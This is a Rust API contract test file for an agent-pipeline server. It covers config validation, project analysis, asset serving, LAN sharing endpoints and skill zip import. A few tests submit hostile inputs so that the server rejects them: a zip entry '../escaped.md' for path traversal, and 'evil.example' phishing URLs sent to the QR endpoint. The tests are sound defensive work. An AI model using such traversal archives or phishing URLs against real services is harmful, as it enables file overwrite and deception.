    let (status, body) = put(&api, "/stage-configs/architect-design", payload.clone()).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(
        body["stage_config"]["node_overrides_json"]["validate_input"]["skills"][0],
        "grilling"
    );

    let cfg = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(
        cfg.node_overrides_json.as_ref(),
        Some(&payload["node_overrides_json"])
    );

    // 未知技能名 → 400，且报错定位到节点
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "node_overrides_json": {"validate_input": {"skills": ["no-such-skill"]}}
        }),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("no-such-skill"), "{body}");
    assert!(err.contains("validate_input"), "报错须定位到节点：{body}");

    // 拒绝后原配置不变（写入校验通过才落库）
    let still = api
        .state
        .store
        .get_stage_config("architect-design")
        .await
        .unwrap()
        .unwrap();
    assert_eq!(
        still.node_overrides_json.as_ref(),
        Some(&payload["node_overrides_json"])
    );
}

/// 决策 172④（票 05）：`PUT /stage-configs` 的准入语义覆盖技能声明的**新形态**。
///
/// 端点复用启动校验本体，故混合数组、未知 mode、未信任 + full 三条都在这里见效——
/// 这是「写入校验与启动语义同源、不漂移」的直接检验。
#[tokio::test]
async fn stage_config_validates_skill_declaration_shapes() {
    let api = api().await;
    let skills_root = api.state.home.root().join("skills");
    let dir = skills_root.join("mixed");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(
        dir.join("SKILL.md"),
        "---\nname: mixed\ndescription: 测试技能\n---\n\n正文",
    )
    .unwrap();

    // ① 裸字符串（旧格式）→ 向后兼容，可写入
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"node_overrides_json": {"validate_input": {"skills": ["mixed"]}}}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "旧格式必须零迁移：{body}");

    // ② 对象形态 + mode = name + trusted = true → 可写入
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"node_overrides_json": {"validate_input": {"skills": [
            {"name": "mixed", "mode": "name", "trusted": true}
        ]}}}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    // ③ 非法 mode → 400，报错定位到节点
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"node_overrides_json": {"validate_input": {"skills": [
            {"name": "mixed", "mode": "half"}
        ]}}}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("half"), "{body}");
    assert!(err.contains("validate_input"), "报错须定位到节点：{body}");

    // ④ 未信任 + full → 400（选型 D：不得全文注入未信任技能）
    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"node_overrides_json": {"validate_input": {"skills": [
            {"name": "mixed", "mode": "full", "trusted": false}
        ]}}}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("信任"),
        "报错须点明信任：{body}"
    );
}

/// 决策 172③（票 07）：兄弟文件缺失时 `PUT /stage-configs` 即拒绝。
///
/// 技能包残缺必须在写入时暴露，而不是等 agent 开工才拿到少一节的正文。
#[tokio::test]
async fn stage_config_rejects_skill_with_missing_sibling() {
    let api = api().await;
    let dir = api.state.home.root().join("skills").join("broken");
    std::fs::create_dir_all(&dir).unwrap();
    std::fs::write(dir.join("SKILL.md"), "主文档\n\n[gone.md](gone.md)\n").unwrap();

    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({"node_overrides_json": {"validate_input": {"skills": ["broken"]}}}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("broken"), "须含技能名：{body}");
    assert!(err.contains("gone.md"), "须含缺失文件名：{body}");
}

#[tokio::test]
async fn stage_config_rejects_empty_knowledge_skill_body() {
    // 决策 170：知识型技能正文为空的用户文件 → 拒绝（与 persona_path 同口径）
    let api = api().await;
    let skill_dir = api.state.home.root().join("skills").join("blank-skill");
    std::fs::create_dir_all(&skill_dir).unwrap();
    std::fs::write(skill_dir.join("SKILL.md"), "  \n").unwrap();

    let (status, body) = put(
        &api,
        "/stage-configs/architect-design",
        serde_json::json!({
            "node_overrides_json": {"validate_input": {"skills": ["blank-skill"]}}
        }),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("正文为空"),
        "{body}"
    );
}

#[tokio::test]
async fn stage_config_accepts_pseudo_stage_keys_but_rejects_unknown() {
    let api = api().await;

    let (status, body) = put(
        &api,
        "/stage-configs/project_analysis",
        serde_json::json!({"provider_id": "p-default"}),
    )
    .await;
    assert_eq!(
        status,
        StatusCode::OK,
        "伪阶段键应可配置（决策 67/87）：{body}"
    );

    let (status, body) = put(&api, "/stage-configs/nope", serde_json::json!({})).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("未知阶段"),
        "{body}"
    );
}

#[tokio::test]
async fn stage_config_rejects_unusable_provider_and_persona() {
    let api = api().await;

    let (status, body) = put(
        &api,
        "/stage-configs/review",
        serde_json::json!({"provider_id": "missing-provider"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("provider"),
        "{body}"
    );

    let (status, body) = put(
        &api,
        "/stage-configs/review",
        serde_json::json!({"persona_path": "personas/no-such-file.md"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("persona_path"),
        "{body}"
    );

    // 校验失败不得落库
    assert!(api
        .state
        .store
        .get_stage_config("review")
        .await
        .unwrap()
        .is_none());
}

#[tokio::test]
async fn stage_config_write_rejects_unknown_tool_names() {
    // 决策 154 的后续票：拼错的工具名从「静默丢弃 + 一条 warn」改为**拒绝写入**。
    // 报文要把未知名字与 v1 已知工具集一起给出——照它改配置才知道该写什么。
    let api = api().await;

    let (status, body) = put(
        &api,
        "/stage-configs/develop",
        serde_json::json!({"tools_json": ["read_file", "web_search", "read_fil"]}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    let msg = body["error"].as_str().unwrap();
    assert!(msg.contains("web_search"), "须点名未知工具：{msg}");
    assert!(msg.contains("read_fil"), "每个未知名字都要列出：{msg}");
    assert!(msg.contains("develop"), "须定位到阶段：{msg}");
    // 已知工具集一并给出（照着改，不用去翻文档）
    assert!(msg.contains("read_file"), "已知集合须列出：{msg}");
    assert!(msg.contains("spawn_sub_agent"), "已知集合含扩展工具：{msg}");

    // 形态非法同样拒绝：非字符串项在旧行为下会被静默忽略，那正是本票要关掉的路
    let (status, body) = put(
        &api,
        "/stage-configs/develop",
        serde_json::json!({"tools_json": ["read_file", 42]}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("非字符串"),
        "{body}"
    );

    // 校验失败不得落库
    assert!(api
        .state
        .store
        .get_stage_config("develop")
        .await
        .unwrap()
        .is_none());

    // 正面：v1 已知工具集（8 内置 + spawn_sub_agent）**全都能写进去**——否则「拒绝」
    // 可能只是拒得太多。逐个穷尽而不是抽查：漏掉一个名字的表现是「这个工具配不上」。
    let (status, body) = put(
        &api,
        "/stage-configs/develop",
        serde_json::json!({"tools_json": [
            "write_file", "edit_file", "read_file", "delete_file",
            "list_dir", "run_command", "submit_metadata", "Skill",
            "spawn_sub_agent"
        ]}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
}

/// 存量配置的升级路径（决策 154 的后续票）：库里已有的行带未知工具名时，**启动校验**
/// 确定地拒绝并指明是哪个阶段的哪个名字——不静默放行、也不自动清理（自动清理会把
/// 用户的错字悄悄抹掉，让人再也看不到自己写错了什么）。
///
/// 直接落库（绕开 `PUT`，它现在会拒）模拟「升级前写下的配置」。
#[tokio::test]
async fn startup_rejects_an_existing_stage_config_with_an_unknown_tool() {
    use agentpipeline_core::types::StageConfig;

    let api = api().await;
    api.state
        .store
        .upsert_stage_config(&StageConfig {
            stage: "develop".into(),
            tools_json: Some(serde_json::json!(["read_file", "web_search"])),
            updated_at: api.state.store.now(),
            ..Default::default()
        })
        .await
        .unwrap();

    let err = api
        .state
        .store
        .validate_startup(&api.state.settings)
        .await
        .expect_err("存量配置含未知工具名 → 启动必须失败")
        .to_string();
    assert!(err.contains("develop"), "须指明阶段：{err}");
    assert!(err.contains("web_search"), "须指明名字：{err}");
}

#[tokio::test]
async fn stage_config_delete_refused_when_cross_family_judge_requires_it() {
    // 与启动同源的校验（决策 134⑤）：删掉被开关依赖的伪阶段配置 → 拒绝
    let api = api_with(Settings {
        pending_resume_cooldown_sec: 5,
        cross_family_judge: true,
        ..Default::default()
    })
    .await;

    // 开关开启却没有配置 → 写入其他阶段也应被拒（整体校验）
    let (status, body) = put(
        &api,
        "/stage-configs/develop",
        serde_json::json!({"provider_id": "p-default"}),
    )
    .await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");

    let (status, body) = put(
        &api,
        "/stage-configs/validator_cross_check",
        serde_json::json!({"provider_id": "p-default"}),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");

    let (status, body) = delete(&api, "/stage-configs/validator_cross_check").await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        api.state
            .store
            .get_stage_config("validator_cross_check")
            .await
            .unwrap()
            .is_some(),
        "被拒绝的删除不得落库"
    );
}

// ─────────────────── project_analysis 伪阶段接入 analyze（决策 48 / 130⑦ / 78）───────────────────

#[tokio::test]
async fn analyze_merges_project_analysis_llm_summary_into_result() {
    use agentpipeline_core::pipeline::pseudo::ProjectAnalysisResult;
    use agentpipeline_core::pipeline::Executor;
    use testkit::{FakeAgent, RecordingKiller, Script};

    let api = api().await;
    let project_id = seed(&api, "t-analyze").await;

    let mut script = Script::new();
    script
        .for_pseudo("pseudo:project_analysis")
        .submit(&ProjectAnalysisResult {
            summary: "Rust 单仓服务，用 cargo 测试".into(),
            suspicious: vec!["没有 CI 配置".into()],
        });

    // 注入带脚本化 LLM 的执行器（生产实现是 ProductionLlm，替换边界只到 LLM 响应流）
    let executor = Arc::new(Executor::new(
        api.state.store.clone(),
        api.state.settings.clone(),
        api.state.sse.clone(),
        Arc::new(FakeAgent::new(script)),
        Arc::new(RecordingKiller::new()),
    ));
    let mut state = api.state.clone();
    state.executor = Some(executor);
    let router = build_router(state);

    let (status, body) = json_body(
        router
            .clone()
            .oneshot(
                request("POST", "/projects/analyze")
                    .header(header::CONTENT_TYPE, "application/json")
                    .body(Body::from(
                        serde_json::json!({ "project_id": project_id }).to_string(),
                    ))
                    .unwrap(),
            )
            .await
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED, "{body}");

    // 异步分析：轮询到终态
    let mut analysis = Value::Null;
    for _ in 0..200 {
        let (_, body) = json_body(
            router
                .clone()
                .oneshot(
                    request("GET", &format!("/projects/{project_id}/analysis"))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap(),
        )
        .await;
        if body["status"] == "done" || body["status"] == "failed" {
            analysis = body;
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    }

    assert_eq!(analysis["status"], "done", "{analysis}");
    assert_eq!(
        analysis["result"]["summary"],
        "Rust 单仓服务，用 cargo 测试"
    );
    assert_eq!(analysis["result"]["suspicious"][0], "没有 CI 配置");
    assert!(
        analysis["result"]["language"].is_string(),
        "确定性探测事实必须保留：{analysis}"
    );

    // 票 10 / 决策 100：项目级伪阶段落独立 run + 会话行（无任务、project_id 归属）
    let runs = api
        .state
        .store
        .list_project_runs(&project_id)
        .await
        .unwrap();
    assert_eq!(runs.len(), 1, "应落一行项目级伪阶段 run");
    assert_eq!(runs[0].agent_type, "pseudo:project_analysis");
    assert!(runs[0].task_id.is_none() && runs[0].cursor_id.is_none());
    assert_eq!(
        runs[0].status,
        agentpipeline_core::types::NodeStatus::Success
    );
    let conversation = api
        .state
        .store
        .get_project_conversation(&project_id, runs[0].id)
        .await
        .unwrap()
        .expect("应落一行项目级伪阶段会话");
    assert_eq!(conversation.agent_type, "pseudo:project_analysis");

    // 决策 130 ②：项目级伪阶段计入全局 total_calls（非 system）
    let all = api.state.store.all_runs().await.unwrap();
    assert_eq!(agentpipeline_core::metrics::total_calls(&all), 1);
}

#[tokio::test]
async fn analyze_keeps_facts_and_records_summary_error_when_llm_unavailable() {
    // 验收：LLM 不可用时的既有降级不回退——保留确定事实 + 记 summary_error，
    // 且 run 行按决策 100 收尾为 failed（不落会话），整个分析仍 done。
    use agentpipeline_core::agent::client::{AgentResponse, LlmClient, LlmRequest};
    use agentpipeline_core::pipeline::Executor;
    use futures::future::BoxFuture;
    use testkit::RecordingKiller;

    struct Unavailable;
    impl LlmClient for Unavailable {
        fn complete(
            &self,
            _request: LlmRequest,
        ) -> BoxFuture<'static, agentpipeline_core::Result<AgentResponse>> {
            Box::pin(async { Err(agentpipeline_core::Error::Llm("provider 不可用".into())) })
        }
    }

    let api = api().await;
    let project_id = seed(&api, "t-degraded").await;

    let executor = Arc::new(Executor::new(
        api.state.store.clone(),
        api.state.settings.clone(),
        api.state.sse.clone(),
        Arc::new(Unavailable),
        Arc::new(RecordingKiller::new()),
    ));
    let mut state = api.state.clone();
    state.executor = Some(executor);
    let router = build_router(state);

    let (status, _) = json_body(
        router
            .clone()
            .oneshot(
                request("POST", "/projects/analyze")
                    .header(header::CONTENT_TYPE, "application/json")
                    .body(Body::from(
                        serde_json::json!({ "project_id": project_id }).to_string(),
                    ))
                    .unwrap(),
            )
            .await
            .unwrap(),
    )
    .await;
    assert_eq!(status, StatusCode::ACCEPTED);

    let mut analysis = Value::Null;
    for _ in 0..200 {
        let (_, body) = json_body(
            router
                .clone()
                .oneshot(
                    request("GET", &format!("/projects/{project_id}/analysis"))
                        .body(Body::empty())
                        .unwrap(),
                )
                .await
                .unwrap(),
        )
        .await;
        if body["status"] == "done" || body["status"] == "failed" {
            analysis = body;
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(20)).await;
    }

    assert_eq!(analysis["status"], "done", "降级不使分析失败：{analysis}");
    assert!(
        analysis["result"]["summary_error"].is_string(),
        "应记下摘要错误原因：{analysis}"
    );
    assert!(
        analysis["result"]["language"].is_string(),
        "确定性探测事实必须保留：{analysis}"
    );

    // run 行仍落库并收尾为 failed（决策 100：失败等同父节点失败）
    let runs = api
        .state
        .store
        .list_project_runs(&project_id)
        .await
        .unwrap();
    assert_eq!(runs.len(), 1);
    assert_eq!(
        runs[0].status,
        agentpipeline_core::types::NodeStatus::Failed
    );
    assert!(runs[0].error.is_some(), "失败原因应写入 run 行");
}

// ── 前端静态资源同源托管（决策 155）──────────────────────────────

/// oneshot 后取原始字节（静态资源不是 JSON，不复用 `json_body`）。
async fn raw(response: axum::response::Response) -> (StatusCode, Vec<u8>) {
    let status = response.status();
    let bytes = axum::body::to_bytes(response.into_body(), 8 * 1024 * 1024)
        .await
        .unwrap();
    (status, bytes.to_vec())
}

async fn get_raw(api: &Api, uri: &str) -> (StatusCode, Vec<u8>) {
    let response = api
        .router
        .clone()
        .oneshot(request("GET", uri).body(Body::empty()).unwrap())
        .await
        .unwrap();
    raw(response).await
}

#[tokio::test]
async fn root_serves_embedded_frontend_or_build_hint() {
    let api = api().await;
    let (status, bytes) = get_raw(&api, "/").await;
    let body = String::from_utf8_lossy(&bytes).into_owned();
    assert_eq!(status, 200, "{body}");
    assert!(body.contains("AgentPipeline"), "{body}");
    if app::assets::EMBEDDED_ASSETS.is_empty() {
        assert!(
            body.contains("make build"),
            "未内嵌时应返回构建提示页：{body}"
        );
    } else {
        assert!(
            body.contains("/assets/"),
            "内嵌时应返回构建产物 index.html：{body}"
        );
    }
}

#[tokio::test]
async fn embedded_assets_are_served_verbatim_with_mime() {
    let api = api().await;
    let Some((name, expected)) = app::assets::EMBEDDED_ASSETS.first() else {
        // 未内嵌（无 dist 的构建环境）：未知资产契约恒为 404
        let (status, _) = get_raw(&api, "/assets/index-000000.js").await;
        assert_eq!(status, 404);
        return;
    };

    let response = api
        .router
        .clone()
        .oneshot(
            request("GET", &format!("/{name}"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    let content_type = response
        .headers()
        .get(header::CONTENT_TYPE)
        .expect("应有 Content-Type")
        .to_str()
        .unwrap()
        .to_owned();
    let (status, bytes) = raw(response).await;

    assert_eq!(status, 200);
    assert_eq!(&bytes, *expected, "资产应原样回放");
    let ext = name.rsplit('.').next().unwrap_or("");
    let expect_mime = match ext {
        "html" => "text/html; charset=utf-8",
        "js" => "text/javascript; charset=utf-8",
        "css" => "text/css; charset=utf-8",
        _ => return,
    };
    assert_eq!(content_type, expect_mime);
}

#[tokio::test]
async fn unknown_asset_returns_404() {
    let api = api().await;
    let (status, _) = get_raw(&api, "/assets/deadbeef-not-here.js").await;
    assert_eq!(status, 404);
}

/* ─────────── 局域网分享端点（决策 167）：/server-info 与 /server-info/qr.svg ─────────── */

#[tokio::test]
async fn server_info_reports_bind_host_port_and_loopback_flag() {
    let api = api().await;
    let (status, body) = get(&api, "/server-info").await;
    assert_eq!(status, 200);
    // 契约测试的 AppState 由 AppState::new 构造，缺省 bind_host = 127.0.0.1
    assert_eq!(body["host"], "127.0.0.1");
    assert_eq!(body["port"], PORT);
    assert_eq!(
        body["loopback_only"], true,
        "缺省绑定是回环，分享页据此提示如何开启局域网访问"
    );
    assert!(
        body["addresses"].is_array(),
        "addresses 恒为数组（枚举不到时为空表，不是 null）：{body}"
    );
    // 端口来源（决策 213）：缺省构造走 `[server] port` 那一级——桌面壳与不传 `--port`
    // 的命令行都在这一级，也是「重启后手机书签仍有效」的前提。
    assert_eq!(body["port_source"], "config");
}

/// 端口来源随 `with_port_source` 上报——`fallback` 是唯一要界面出声的一档
/// （首选端口被占、退让到内核随机端口，手机上的旧地址下次启动就作废）。
#[tokio::test]
async fn server_info_reports_port_source() {
    let home = TestHome::new().unwrap();
    let (store, _clock) = home.setup().await.unwrap();
    let state = AppState::new(store, home.home().clone(), Settings::default(), PORT)
        .with_port_source(app::state::PortSource::Fallback);
    let router = build_router(state);

    let response = router
        .oneshot(request("GET", "/server-info").body(Body::empty()).unwrap())
        .await
        .unwrap();
    let (status, body) = json_body(response).await;
    assert_eq!(status, 200);
    assert_eq!(body["port_source"], "fallback");
    // 端口本身照旧是真实端口（退让改的是号码，不是「读不到就别信」的语义）
    assert_eq!(body["port"], PORT);
}

#[tokio::test]
async fn server_info_reports_lan_bind_as_not_loopback_only() {
    // 绑 0.0.0.0 时 loopback_only 必须为 false，否则分享页会一直显示「请绑 0.0.0.0」的死循环指引
    let home = TestHome::new().unwrap();
    let (store, _clock) = home.setup().await.unwrap();
    let state = AppState::new(store, home.home().clone(), Settings::default(), PORT)
        .with_bind_host("0.0.0.0");
    let router = build_router(state);

    let response = router
        .oneshot(request("GET", "/server-info").body(Body::empty()).unwrap())
        .await
        .unwrap();
    let (status, body) = json_body(response).await;
    assert_eq!(status, 200);
    assert_eq!(body["host"], "0.0.0.0");
    assert_eq!(body["loopback_only"], false);
    // 绑定来源（决策 186）：缺省构造是回环，`with_bind_host` 只改了地址，故来源仍是 config
    assert_eq!(body["bind_source"], "config");
}

/// 绑定来源随 `with_bind_source` 上报——界面据此说清「这颗钮按了重启还算不算数」。
#[tokio::test]
async fn server_info_reports_bind_source() {
    let home = TestHome::new().unwrap();
    let (store, _clock) = home.setup().await.unwrap();
    let state = AppState::new(store, home.home().clone(), Settings::default(), PORT)
        .with_bind_host("0.0.0.0")
        .with_bind_source(app::state::BindSource::Startup);
    let router = build_router(state);

    let response = router
        .oneshot(request("GET", "/server-info").body(Body::empty()).unwrap())
        .await
        .unwrap();
    let (status, body) = json_body(response).await;
    assert_eq!(status, 200);
    assert_eq!(body["bind_source"], "startup");
}

/* ─────────── 绑定开关（决策 186）：POST / DELETE /server/lan ─────────── */

/// 局域网来源调用改绑端点 → 403。
///
/// 这是全站唯一能把服务暴露到局域网的入口，护栏必须钉在**执行点**上（不是靠界面藏按钮）：
/// 局域网里任何一台设备若能调它，配对令牌（票 07）就白设了——先把它打开，再从自己的
/// 机器上来。判定沿用票 07 那一套对端地址扩展。
#[tokio::test]
async fn server_lan_from_lan_peer_is_forbidden() {
    let api = api().await;
    for (method, path, body) in [
        ("POST", "/server/lan", r#"{"enabled":true}"#),
        ("DELETE", "/server/lan", ""),
    ] {
        let mut req = request(method, path)
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(body))
            .unwrap();
        req.extensions_mut()
            .insert(PeerAddr(SocketAddr::from(([192, 168, 1, 50], 40000))));
        let response = api.router.clone().oneshot(req).await.unwrap();
        let (status, payload) = json_body(response).await;
        assert_eq!(status, 403, "{method} {path} 应拒绝局域网来源：{payload}");
        assert!(
            payload["error"].as_str().unwrap_or("").contains("本机"),
            "报文要说清只有本机可以改：{payload}"
        );
    }
}

/// 回环来源、但这个实例没起监听器（契约测试的 in-process router）→ 503「未接线」。
///
/// 与对讲台三个端点的姿态一致：能力不在这台机器上时，报的是「这次没接上」而不是 500。
#[tokio::test]
async fn server_lan_without_a_listener_is_unbound() {
    let api = api().await;
    for (method, path, body) in [
        ("POST", "/server/lan", r#"{"enabled":true}"#),
        ("DELETE", "/server/lan", ""),
    ] {
        let mut req = request(method, path)
            .header(header::CONTENT_TYPE, "application/json")
            .body(Body::from(body))
            .unwrap();
        req.extensions_mut()
            .insert(PeerAddr(SocketAddr::from(([127, 0, 0, 1], 51234))));
        let response = api.router.clone().oneshot(req).await.unwrap();
        let (status, payload) = json_body(response).await;
        assert_eq!(status, 503, "{method} {path}：{payload}");
        assert!(
            payload["error"].as_str().unwrap_or("").contains("未接线"),
            "{payload}"
        );
    }
}

#[tokio::test]
async fn qr_svg_renders_for_a_loopback_url() {
    let api = api().await;
    let url = format!("http://127.0.0.1:{PORT}");
    let response = api
        .router
        .clone()
        .oneshot(
            request("GET", &format!("/server-info/qr.svg?url={url}"))
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), 200);
    let content_type = response
        .headers()
        .get(header::CONTENT_TYPE)
        .expect("应有 Content-Type")
        .to_str()
        .unwrap()
        .to_owned();
    assert_eq!(content_type, "image/svg+xml; charset=utf-8");
    assert_eq!(
        response
            .headers()
            .get(header::CACHE_CONTROL)
            .map(|v| v.to_str().unwrap()),
        Some("no-store"),
        "二维码随端口变化，不得缓存"
    );
    let (_, bytes) = raw(response).await;
    let svg = String::from_utf8(bytes).unwrap();
    assert!(svg.starts_with("<?xml"), "应是 SVG：{svg:.60}");
    assert!(svg.contains("<path"), "应含二维码模块");
}

#[tokio::test]
async fn qr_svg_rejects_arbitrary_urls() {
    // 只允许编码本服务自己的地址：否则这个端点成了「用你的服务生成任意二维码」的图床
    let api = api().await;
    let (status, body) = get(
        &api,
        "/server-info/qr.svg?url=http%3A%2F%2Fevil.example%2Fphish",
    )
    .await;
    assert_eq!(status, 400, "外部 URL 必须被拒绝：{body}");
}

/// 把 URL 值编码进查询串（只覆盖这些用例用到的字符集）。
fn encode_query_value(raw: &str) -> String {
    raw.chars()
        .map(|c| match c {
            ':' => "%3A".to_string(),
            '/' => "%2F".to_string(),
            '?' => "%3F".to_string(),
            '=' => "%3D".to_string(),
            '&' => "%26".to_string(),
            _ => c.to_string(),
        })
        .collect()
}

async fn qr_status(api: &Api, url: &str) -> StatusCode {
    let (status, _) = get(
        api,
        &format!("/server-info/qr.svg?url={}", encode_query_value(url)),
    )
    .await;
    status
}

#[tokio::test]
async fn qr_svg_accepts_whitelisted_origin_with_query() {
    // 配对 URL（origin + ?pair=）必须能编码成二维码：扫码是手机加入的唯一入口
    let api = api().await;
    let paired =
        app::routes::server_info::pairing_url(&format!("http://127.0.0.1:{PORT}"), "PAIRTOKEN");
    assert_eq!(
        qr_status(&api, &paired).await,
        StatusCode::OK,
        "白名单 origin 追加 query 应放行（票 07 放宽）"
    );
}

#[tokio::test]
async fn qr_svg_rejects_whitelisted_origin_with_wrong_port() {
    let api = api().await;
    let wrong_port = format!("http://127.0.0.1:{}", PORT + 1);
    assert_eq!(
        qr_status(&api, &wrong_port).await,
        StatusCode::BAD_REQUEST,
        "同主机不同端口是不同 origin"
    );
}

#[tokio::test]
async fn qr_svg_rejects_external_origin_with_query() {
    let api = api().await;
    assert_eq!(
        qr_status(&api, "http://evil.example/?pair=abc").await,
        StatusCode::BAD_REQUEST,
        "外站 origin 即便带 query 也必须拒绝"
    );
}

#[tokio::test]
async fn server_info_endpoints_are_reachable_without_client_header() {
    // 两个端点都是纯 GET：不携带 X-AgentPipeline 也必须可达（手机首次加载页面时还没有它）
    let api = api().await;
    let (status, _) = get(&api, "/server-info").await;
    assert_eq!(status, 200);
    let (status, _) = get(
        &api,
        &format!("/server-info/qr.svg?url=http%3A%2F%2F127.0.0.1%3A{PORT}"),
    )
    .await;
    assert_eq!(status, 200);
}

// ═══════════════════ 技能市场：本地导入 / 扫描 / 卸载（决策 172⑤，票 09）═══════════════════
//
// 五条契约用例对应票面列出的验收清单：上传合法 zip 成功 / 缺 `SKILL.md` 拒绝 /
// 同名未确认拒绝 / 扫描返回清单 / 卸载后引用报错。全部**离线**（无网络调用）。

/// 用原始 zip 字节 POST（请求体就是 zip，不是 multipart，见 routes/skills.rs 模块头注释）。
async fn post_zip(api: &Api, uri: &str, zip: Vec<u8>) -> (StatusCode, Value) {
    call(
        api,
        request("POST", uri)
            .header(header::CONTENT_TYPE, "application/zip")
            .body(Body::from(zip))
            .unwrap(),
    )
    .await
}

fn skills_root(api: &Api) -> std::path::PathBuf {
    api.state.home.skills_dir()
}

/// ① 上传合法 zip → 成功落盘（布局为 `{name}/SKILL.md` + 兄弟文件）。
#[tokio::test]
async fn import_zip_installs_skill_with_siblings() {
    let api = api().await;
    let zip = skill_zip("grill", "拷问协议正文", &[("tests.md", "兄弟文件")]);

    let (status, body) = post_zip(&api, "/skills/import", zip).await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert_eq!(body["skill"]["name"], "grill");
    assert_eq!(body["skill"]["sibling_count"], 1);

    let root = skills_root(&api);
    assert!(root.join("grill/SKILL.md").is_file());
    assert!(
        root.join("grill/tests.md").is_file(),
        "兄弟文件须一并落盘，否则票 07 的展开会缺文件"
    );
    // 装完即可见（`GET /skills` 与启动校验同源）
    let (status, body) = get(&api, "/skills").await;
    assert_eq!(status, StatusCode::OK);
    let names: Vec<&str> = body["skills"]
        .as_array()
        .unwrap()
        .iter()
        .map(|s| s["name"].as_str().unwrap())
        .collect();
    assert!(names.contains(&"grill"), "{body}");
}

/// ② 缺 `SKILL.md` → 400 拒绝，报文说清缺什么，且**不落盘**。
#[tokio::test]
async fn import_zip_without_skill_md_is_rejected() {
    let api = api().await;
    let zip = zip_bytes(&[("grill/notes.md", "只有笔记")]);

    let (status, body) = post_zip(&api, "/skills/import", zip).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(
        body["error"].as_str().unwrap().contains("SKILL.md"),
        "{body}"
    );
    assert!(
        !skills_root(&api).join("grill").exists(),
        "拒绝的包不得留下半份痕迹"
    );
}

/// 路径穿越的包被拒绝，且技能根之外不留任何文件（票 09 的主要风险）。
#[tokio::test]
async fn import_zip_rejects_path_traversal() {
    let api = api().await;
    let zip = zip_bytes(&[("s/SKILL.md", "正文"), ("../escaped.md", "逃逸")]);

    let (status, body) = post_zip(&api, "/skills/import", zip).await;
    assert_eq!(status, StatusCode::BAD_REQUEST, "{body}");
    assert!(body["error"].as_str().unwrap().contains("穿越"), "{body}");
    assert!(!skills_root(&api).join("escaped.md").exists());
    assert!(!api.state.home.root().join("escaped.md").exists());
}

/// ③ 同名冲突默认拒绝，报出技能名与当前来源；显式 `overwrite=true` 才覆盖。
#[tokio::test]
async fn import_zip_same_name_requires_explicit_overwrite() {
    let api = api().await;
    let root = skills_root(&api);

    let (status, _) = post_zip(&api, "/skills/import", skill_zip("dupe", "第一版正文", &[])).await;
    assert_eq!(status, StatusCode::OK);

    // 未确认 → 409，报文含技能名与当前来源
    let (status, body) =
        post_zip(&api, "/skills/import", skill_zip("dupe", "第二版正文", &[])).await;
    assert_eq!(status, StatusCode::CONFLICT, "{body}");
    let err = body["error"].as_str().unwrap();
    assert!(err.contains("dupe"), "报文须含技能名：{body}");
    assert!(err.contains("SKILL.md"), "报文须含当前来源：{body}");

    // 原内容未被改动
    assert!(std::fs::read_to_string(root.join("dupe/SKILL.md"))
        .unwrap()
        .contains("第一版正文"));

    // 显式确认 → 覆盖成功
    let (status, body) = post_zip(
        &api,
        "/skills/import?overwrite=true",
        skill_zip("dupe", "第二版正文", &[]),
    )
    .await;
    assert_eq!(status, StatusCode::OK, "{body}");
    assert!(std::fs::read_to_string(root.join("dupe/SKILL.md"))
        .unwrap()
        .contains("第二版正文"));
}

/// ④ 目录扫描返回清单：名字 + 描述 + 是否已存在。
#[tokio::test]
async fn scan_lists_importable_skills_with_existence() {
    let api = api().await;
    let source = api._home.scratch_dir("zcode-skills");

    write_skill_dir(&source, "scan-me", "待导入的正文", &[("tests.md", "兄弟")]);
    // 已在目标技能根里（exists 须为 true）
    let root = skills_root(&api);
    std::fs::create_dir_all(root.join("already")).unwrap();
    std::fs::write(root.join("already/SKILL.md"), "已存在").unwrap();
